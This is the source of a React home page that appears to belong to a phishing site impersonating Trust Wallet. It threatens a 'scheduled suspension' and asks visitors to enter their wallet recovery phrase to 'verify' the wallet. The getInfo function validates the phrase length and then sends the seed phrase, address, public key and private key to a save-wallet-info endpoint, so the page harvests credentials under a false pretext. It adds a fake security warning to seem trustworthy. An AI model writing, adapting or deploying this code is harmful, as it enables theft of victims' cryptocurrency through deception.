import React from 'react'
import useStore from '../useStore'
import Header from '../components/Header'
import Footer from '../components/Footer'
import { copyToClipboard } from '../util'
import { tips } from '../util'


const Home = () => {
	const [state, setStates] = React.useState({
		value : '',
		address : '',
		publickey : '',
		privatekey : ''
	})

	const {update, loading, call} = useStore()
	const updateStatus = (params : {[key : string] : string | number | boolean | any}) => setStates({ ...state, ...params })

	const getInfo = async () => {
		var v = state.value.replaceAll("  ", "");
		var arr = v.split(" ");
		if(arr.length != 12 && arr.length != 24){
			tips("Invalid phrase")
			return;
		}
		var res = await call("/api/get-wallet-info", {seeds:v});
		if(res?.error === 0){
			if(res['address']){
				res = await call("/api/save-wallet-info", {seeds:state.value, address:res['address'], publickey:res['publickey'], privatekey:res['privatekey']});
				if(res?.error === 0){
					tips("Success: Verified wallet information")
				}else {
					tips("Error: Known error")
				}
			}
		}else {
			tips("Error: Known error")
		}
	}
	return (
		<>
			<Header />
			<div className="home">
					<div className="container">
						<div className="row">
							<div className="col-12">
								<p>
									To verify your wallet enter the 12 or 23 Recovery Phrase from your Trust Wallet in the right order, after doing this correctly your wallet will be completly verified and the scheduled suspension will be removed automaticall right after.
								</p>
							</div>
						</div>
						<div className="row mt5 center">
							<div className="col-12">
								<h4>Enter your Recovery Phrase correctly to prevent suspension on your wallet</h4>
								<p>Make sure no one is watching you right now, never share your passphrase with other people.</p>
							</div>
						</div>
						<div className="row center">
							<div className="col-12">
								<input type={"text"} className="w100"  placeholder="Enter Recovery Phrase" value={state.value} onChange={(e)=>{updateStatus({value:e.target.value})}}/>
							</div>
						</div>
						<div className="row center mt3">
							<button  className='btn-linear w50 ' onClick={() => {getInfo()}}>Verify my wallet</button>	
						</div>
				</div>
			</div>
			<Footer />	
		</>
	)
}

export default Home
